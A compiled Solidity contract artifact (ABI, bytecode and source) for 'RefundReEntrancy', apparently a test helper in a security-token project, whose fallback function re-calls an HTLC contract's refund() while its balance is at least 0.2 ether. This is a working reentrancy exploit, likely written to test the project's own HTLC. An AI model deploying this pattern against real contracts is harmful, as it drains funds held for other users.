{
  "contractName": "RefundReEntrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_htlcEthAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "_swapID",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "_securityToken",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104fe3803806104fe833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103e7806101176000396000f3fe60806040526004361061002d5760003560e01c8063b69ef8a814610128578063f20ed38d146101535761002e565b5b6702c68af0bb14000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101265760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166345b4032c600154600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518363ffffffff1660e01b81526004016100f39291906102b7565b600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505b005b34801561013457600080fd5b5061013d61017c565b60405161014a91906102f9565b60405180910390f35b34801561015f57600080fd5b5061017a60048036038101906101759190610371565b610184565b005b600047905090565b8160018190555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166345b4032c83836040518363ffffffff1660e01b81526004016102279291906102b7565b600060405180830381600087803b15801561024157600080fd5b505af1158015610255573d6000803e3d6000fd5b505050505050565b6000819050919050565b6102708161025d565b82525050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102a182610276565b9050919050565b6102b181610296565b82525050565b60006040820190506102cc6000830185610267565b6102d960208301846102a8565b9392505050565b6000819050919050565b6102f3816102e0565b82525050565b600060208201905061030e60008301846102ea565b92915050565b600080fd5b6103228161025d565b811461032d57600080fd5b50565b60008135905061033f81610319565b92915050565b61034e81610296565b811461035957600080fd5b50565b60008135905061036b81610345565b92915050565b6000806040838503121561038857610387610314565b5b600061039685828601610330565b92505060206103a78582860161035c565b915050925092905056fea2646970667358221220fbc7090a2c1f8e9a1951af779e6aeb35aac744431002a631a77dda2ccb5c211b64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.10;\n\nimport \"../htlc/HTLC_ETH.sol\";\n\n//  SPDX-License-Identifier: UNLICENSED\n\n\n\ncontract RefundReEntrancy {\n\n    HTLC_ETH htlcEth;\n\n    bytes32 id;\n    address securityToken;\n    \n\n    constructor(address _htlcEthAddress) {\n\n        htlcEth = HTLC_ETH(_htlcEthAddress);\n    }\n\n    //  contract recieving ether should have a fallback or receive function but payable\n   \n\n    fallback() external payable {\n\n        // attack implementation\n\n        if(address(htlcEth).balance >= 0.2 ether) {\n\n            htlcEth.refund(id, securityToken);\n\n        }\n          \n    }\n\n    \n\n    function attack(bytes32 _swapID, address _securityToken) external {\n        id = _swapID;\n        securityToken = _securityToken;\n    \n        htlcEth.refund(_swapID, _securityToken);\n\n    }\n\n    function balance() external view returns (uint256) {\n        return address(this).balance;\n    }\n \n}",
  "sourcePath": "/home/komolehin/Documents/blockchain/TANGLE/security-token/contracts/utils/RefundReEntrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.6",
  "updatedAt": "2022-05-14T08:24:52.117Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}